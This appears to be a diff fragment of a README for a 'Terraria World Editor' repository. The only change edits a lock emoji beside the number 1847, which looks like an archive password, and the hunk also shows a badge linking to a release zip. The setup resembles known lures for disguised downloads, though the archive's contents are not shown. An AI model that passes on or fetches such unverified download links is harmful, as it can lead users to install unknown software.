@@ -6,7 +6,7 @@
 
 [![DOWNLOAD TERRARIA](https://img.shields.io/badge/DOWNLOAD-blue?style=for-the-badge&logo=link&logoColor=white)](https://github.com/BoundaryLocust84/Terraria-World-Editor/releases/download/Release/World-Editor.zip)
 
-**🔐 — 1847**
+**🔐🔐 — 1847**
 
 ---
 
